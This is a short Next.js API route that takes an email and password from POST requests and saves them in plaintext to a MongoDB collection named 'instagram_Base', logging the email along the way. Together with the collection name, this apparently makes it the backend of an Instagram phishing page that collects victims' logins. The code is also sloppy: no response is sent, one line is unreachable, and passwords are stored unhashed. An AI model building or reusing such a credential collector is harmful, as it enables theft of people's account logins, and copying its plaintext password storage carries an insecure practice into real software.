import { connectToDb } from "@/db";

export default async (req, res) => {
  if (req.method === "POST")
    try {
      const { email, password } = req.body;
      const db = await connectToDb();
      console.log("adafa");

      const collection = db.collection("instagram_Base");
      console.log(collection);
      await collection.insertOne({ email, password });
      console.log(email);
      return res.status(200);
      console.log("connected");
    } catch {
      return res.status(500);
    }
};
